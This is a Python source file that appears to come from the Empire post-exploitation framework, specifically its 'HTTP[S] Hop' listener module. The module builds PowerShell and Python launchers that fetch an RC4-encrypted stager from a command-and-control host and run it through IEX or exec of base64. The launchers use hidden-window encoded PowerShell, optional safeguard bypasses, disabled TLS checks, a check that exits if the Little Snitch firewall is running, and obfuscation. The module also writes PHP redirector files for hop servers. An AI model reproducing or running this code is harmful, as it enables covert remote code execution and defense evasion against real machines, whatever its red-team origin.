from __future__ import print_function

import base64
import errno
import os
import random
from builtins import object, str
from typing import List

from empire.server.common import helpers, packets, templating
from empire.server.utils import data_util, listener_util


class Listener(object):
    def __init__(self, mainMenu, params=[]):

        self.info = {
            "Name": "HTTP[S] Hop",
            "Author": ["@harmj0y"],
            "Description": (
                "Starts a http[s] listener (PowerShell or Python) that uses a GET/POST approach."
            ),
            "Category": ("client_server"),
            "Comments": [],
        }

        # any options needed by the stager, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            "Name": {
                "Description": "Name for the listener.",
                "Required": True,
                "Value": "http_hop",
            },
            "RedirectListener": {
                "Description": "Existing listener to redirect the hop traffic to.",
                "Required": True,
                "Value": "",
            },
            "Launcher": {
                "Description": "Launcher string.",
                "Required": True,
                "Value": "powershell -noP -sta -w 1 -enc ",
            },
            "RedirectStagingKey": {
                "Description": "The staging key for the redirect listener, extracted from RedirectListener automatically.",
                "Required": False,
                "Value": "",
            },
            "Host": {
                "Description": "Hostname/IP for staging.",
                "Required": True,
                "Value": "",
            },
            "Port": {
                "Description": "Port for the listener.",
                "Required": True,
                "Value": "",
            },
            "DefaultProfile": {
                "Description": "Default communication profile for the agent, extracted from RedirectListener automatically.",
                "Required": False,
                "Value": "",
            },
            "OutFolder": {
                "Description": "Folder to output redirectors to.",
                "Required": True,
                "Value": "/tmp/http_hop/",
            },
            "SlackURL": {
                "Description": "Your Slack Incoming Webhook URL to communicate with your Slack instance.",
                "Required": False,
                "Value": "",
            },
        }

        # required:
        self.mainMenu = mainMenu
        self.threads = {}

        # optional/specific for this module

    def default_response(self):
        """
        If there's a default response expected from the server that the client needs to ignore,
        (i.e. a default HTTP page), put the generation here.
        """
        return ""

    def validate_options(self):
        """
        Validate all options for this listener.
        """

        for key in self.options:
            if self.options[key]["Required"] and (
                str(self.options[key]["Value"]).strip() == ""
            ):
                print(helpers.color('[!] Option "%s" is required.' % (key)))
                return False

        return True

    def generate_launcher(
        self,
        encode=True,
        obfuscate=False,
        obfuscationCommand="",
        userAgent="default",
        proxy="default",
        proxyCreds="default",
        stagerRetries="0",
        language=None,
        safeChecks="",
        listenerName=None,
        bypasses: List[str] = None,
    ):
        """
        Generate a basic launcher for the specified listener.
        """
        bypasses = [] if bypasses is None else bypasses

        if not language:
            print(
                helpers.color(
                    "[!] listeners/http_hop generate_launcher(): no language specified!"
                )
            )

        if listenerName and (listenerName in self.mainMenu.listeners.activeListeners):

            # extract the set options for this instantiated listener
            listenerOptions = self.mainMenu.listeners.activeListeners[listenerName][
                "options"
            ]
            host = listenerOptions["Host"]["Value"]
            launcher = listenerOptions["Launcher"]["Value"]
            stagingKey = listenerOptions["RedirectStagingKey"]["Value"]
            profile = listenerOptions["DefaultProfile"]["Value"]
            uris = [a for a in profile.split("|")[0].split(",")]
            stage0 = random.choice(uris)

            if language.startswith("po"):
                # PowerShell

                stager = '$ErrorActionPreference = "SilentlyContinue";'
                if safeChecks.lower() == "true":
                    stager = "If($PSVersionTable.PSVersion.Major -ge 3){"

                    for bypass in bypasses:
                        stager += bypass
                    stager += "};[System.Net.ServicePointManager]::Expect100Continue=0;"

                stager += "$wc=New-Object System.Net.WebClient;"

                if userAgent.lower() == "default":
                    userAgent = profile.split("|")[1]
                stager += f"$u='{ userAgent }';"

                if "https" in host:
                    # allow for self-signed certificates for https connections
                    stager += "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};"

                if userAgent.lower() != "none" or proxy.lower() != "none":

                    if userAgent.lower() != "none":
                        stager += "$wc.Headers.Add('User-Agent',$u);"

                    if proxy.lower() != "none":
                        if proxy.lower() == "default":
                            stager += (
                                "$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;"
                            )

                        else:
                            # TODO: implement form for other proxy
                            stager += "$proxy=New-Object Net.WebProxy;"
                            stager += f"$proxy.Address = '{ proxy.lower() }';"
                            stager += "$wc.Proxy = $proxy;"

                        if proxyCreds.lower() == "default":
                            stager += "$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;"

                        else:
                            # TODO: implement form for other proxy credentials
                            username = proxyCreds.split(":")[0]
                            password = proxyCreds.split(":")[1]
                            domain = username.split("\\")[0]
                            usr = username.split("\\")[1]
                            stager += f"$netcred = New-Object System.Net.NetworkCredential('{usr}', '{password}', '{domain}');"
                            stager += "$wc.Proxy.Credentials = $netcred;"

                # TODO: reimplement stager retries?

                # code to turn the key string into a byte array
                stager += (
                    f"$K=[System.Text.Encoding]::ASCII.GetBytes('{ stagingKey }');"
                )

                # this is the minimized RC4 stager code from rc4.ps1
                stager += listener_util.powershell_rc4()

                # prebuild the request routing packet for the launcher
                routingPacket = packets.build_routing_packet(
                    stagingKey,
                    sessionID="00000000",
                    language="POWERSHELL",
                    meta="STAGE0",
                    additional="None",
                    encData="",
                )
                b64RoutingPacket = base64.b64encode(routingPacket).decode("UTF-8")

                # add the RC4 packet to a cookie
                stager += f'$wc.Headers.Add("Cookie","session={ b64RoutingPacket }");'
                stager += f"$ser={ helpers.obfuscate_call_home_address(host) };$t='{ stage0 }';$hop='{ listenerName }';"
                stager += "$data=$wc.DownloadData($ser+$t);"
                stager += "$iv=$data[0..3];$data=$data[4..$data.length];"

                # decode everything and kick it over to IEX to kick off execution
                stager += "-join[Char[]](& $R $data ($IV+$K))|IEX"

                # Remove comments and make one line
                stager = helpers.strip_powershell_comments(stager)
                stager = data_util.ps_convert_to_oneliner(stager)

                if obfuscate:
                    stager = data_util.obfuscate(
                        self.mainMenu.installPath,
                        stager,
                        obfuscationCommand=obfuscationCommand,
                    )
                # base64 encode the stager and return it
                if encode and (
                    (not obfuscate) or ("launcher" not in obfuscationCommand.lower())
                ):
                    return helpers.powershell_launcher(stager, launcher)
                else:
                    # otherwise return the case-randomized stager
                    return stager

            if language.startswith("py"):
                # Python

                launcherBase = "import sys;"
                if "https" in host:
                    # monkey patch ssl woohooo
                    launcherBase += "import ssl;\nif hasattr(ssl, '_create_unverified_context'):ssl._create_default_https_context = ssl._create_unverified_context;\n"

                try:
                    if safeChecks.lower() == "true":
                        launcherBase += "import re, subprocess;"
                        launcherBase += (
                            'cmd = "ps -ef | grep Little\ Snitch | grep -v grep"\n'
                        )
                        launcherBase += "ps = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n"
                        launcherBase += "out, err = ps.communicate()\n"
                        launcherBase += 'if re.search("Little Snitch", out):\n'
                        launcherBase += "   sys.exit()\n"
                except Exception as e:
                    p = "[!] Error setting LittleSnitch in stagger: " + str(e)
                    print(helpers.color(p, color="red"))

                if userAgent.lower() == "default":
                    userAgent = profile.split("|")[1]

                launcherBase += "o=__import__({2:'urllib2',3:'urllib.request'}[sys.version_info[0]],fromlist=['build_opener']).build_opener();"
                launcherBase += "UA='%s';" % (userAgent)
                launcherBase += "server='%s';t='%s';" % (host, stage0)

                # prebuild the request routing packet for the launcher
                routingPacket = packets.build_routing_packet(
                    stagingKey,
                    sessionID="00000000",
                    language="PYTHON",
                    meta="STAGE0",
                    additional="None",
                    encData="",
                )
                b64RoutingPacket = base64.b64encode(routingPacket).decode("UTF-8")

                launcherBase += "import urllib2\n"

                if proxy.lower() != "none":
                    if proxy.lower() == "default":
                        launcherBase += "proxy = urllib2.ProxyHandler();\n"
                    else:
                        proto = proxy.Split(":")[0]
                        launcherBase += (
                            "proxy = urllib2.ProxyHandler({'"
                            + proto
                            + "':'"
                            + proxy
                            + "'});\n"
                        )

                    if proxyCreds != "none":
                        if proxyCreds == "default":
                            launcherBase += "o = urllib2.build_opener(proxy);\n"
                        else:
                            launcherBase += "proxy_auth_handler = urllib2.ProxyBasicAuthHandler();\n"
                            username = proxyCreds.split(":")[0]
                            password = proxyCreds.split(":")[1]
                            launcherBase += (
                                "proxy_auth_handler.add_password(None,'"
                                + proxy
                                + "','"
                                + username
                                + "','"
                                + password
                                + "');\n"
                            )
                            launcherBase += (
                                "o = urllib2.build_opener(proxy, proxy_auth_handler);\n"
                            )
                    else:
                        launcherBase += "o = urllib2.build_opener(proxy);\n"
                else:
                    launcherBase += "o = urllib2.build_opener();\n"

                # add the RC4 packet to a cookie
                launcherBase += (
                    'o.addheaders=[(\'User-Agent\',UA), ("Cookie", "session=%s")];\n'
                    % (b64RoutingPacket)
                )

                # install proxy and creds globally, so they can be used with urlopen.
                launcherBase += "urllib2.install_opener(o);\n"
                launcherBase += "a=o.open(server+t).read();\n"

                # download the stager and extract the IV
                launcherBase += listener_util.python_extract_stager(stagingKey)

                if encode:
                    launchEncoded = base64.b64encode(launcherBase).decode("UTF-8")
                    launcher = (
                        "echo \"import sys,base64;exec(base64.b64decode('%s'));\" | python3 &"
                        % (launchEncoded)
                    )
                    return launcher
                else:
                    return launcherBase

            else:
                print(
                    helpers.color(
                        "[!] listeners/http_hop generate_launcher(): invalid language specification: only 'powershell' and 'python' are current supported for this module."
                    )
                )

        else:
            print(
                helpers.color(
                    "[!] listeners/http_hop generate_launcher(): invalid listener name specification!"
                )
            )

    def generate_stager(
        self,
        listenerOptions,
        encode=False,
        encrypt=True,
        obfuscate=False,
        obfuscationCommand="",
        language=None,
    ):
        """
        If you want to support staging for the listener module, generate_stager must be
        implemented to return the stage1 key-negotiation stager code.
        """
        print(
            helpers.color(
                "[!] generate_stager() not implemented for listeners/http_hop"
            )
        )
        return ""

    def generate_agent(
        self, listenerOptions, language=None, obfuscate=False, obfuscationCommand=""
    ):
        """
        If you want to support staging for the listener module, generate_agent must be
        implemented to return the actual staged agent code.
        """
        print(
            helpers.color("[!] generate_agent() not implemented for listeners/http_hop")
        )
        return ""

    def generate_comms(self, listenerOptions, language=None):
        """
        Generate just the agent communication code block needed for communications with this listener.

        This is so agents can easily be dynamically updated for the new listener.
        """
        host = listenerOptions["Host"]["Value"]

        if language:
            if language.lower() == "powershell":
                template_path = [
                    os.path.join(self.mainMenu.installPath, "/data/agent/stagers"),
                    os.path.join(self.mainMenu.installPath, "./data/agent/stagers"),
                ]

                eng = templating.TemplateEngine(template_path)
                template = eng.get_template("http/http.ps1")

                template_options = {
                    "session_cookie": "",
                    "host": host,
                }

                comms = template.render(template_options)
                return comms

            elif language.lower() == "python":
                template_path = [
                    os.path.join(self.mainMenu.installPath, "/data/agent/stagers"),
                    os.path.join(self.mainMenu.installPath, "./data/agent/stagers"),
                ]
                eng = templating.TemplateEngine(template_path)
                template = eng.get_template("http/comms.py")

                template_options = {
                    "session_cookie": "",
                    "host": host,
                }

                comms = template.render(template_options)
                return comms

            else:
                print(
                    helpers.color(
                        "[!] listeners/http_hop generate_comms(): invalid language specification, only 'powershell' and 'python' are current supported for this module."
                    )
                )
        else:
            print(
                helpers.color(
                    "[!] listeners/http_hop generate_comms(): no language specified!"
                )
            )

    def start(self, name=""):
        """
        Nothing to actually start for a hop listner, but ensure the stagingKey is
        synced with the redirect listener.
        """

        redirectListenerName = self.options["RedirectListener"]["Value"]
        redirectListenerOptions = data_util.get_listener_options(redirectListenerName)

        if redirectListenerOptions:

            self.options["RedirectStagingKey"][
                "Value"
            ] = redirectListenerOptions.options["StagingKey"]["Value"]
            self.options["DefaultProfile"]["Value"] = redirectListenerOptions.options[
                "DefaultProfile"
            ]["Value"]
            redirectHost = redirectListenerOptions.options["Host"]["Value"]

            uris = [
                a
                for a in self.options["DefaultProfile"]["Value"]
                .split("|")[0]
                .split(",")
            ]

            hopCodeLocation = "%s/data/misc/hop.php" % (self.mainMenu.installPath)
            with open(hopCodeLocation, "r") as f:
                hopCode = f.read()

            hopCode = hopCode.replace("REPLACE_SERVER", redirectHost)
            hopCode = hopCode.replace("REPLACE_HOP_NAME", self.options["Name"]["Value"])

            saveFolder = self.options["OutFolder"]["Value"]
            for uri in uris:
                saveName = "%s%s" % (saveFolder, uri)

                # recursively create the file's folders if they don't exist
                if not os.path.exists(os.path.dirname(saveName)):
                    try:
                        os.makedirs(os.path.dirname(saveName))
                    except OSError as exc:  # Guard against race condition
                        if exc.errno != errno.EEXIST:
                            raise

                with open(saveName, "w") as f:
                    f.write(hopCode)
                    print(
                        helpers.color(
                            "[*] Hop redirector written to %s . Place this file on the redirect server."
                            % (saveName)
                        )
                    )

            return True

        else:
            print(
                helpers.color(
                    "[!] Redirect listener name %s not a valid listener!"
                    % (redirectListenerName)
                )
            )
            return False

    def shutdown(self, name=""):
        """
        Nothing to actually shut down for a hop listner.
        """
        pass
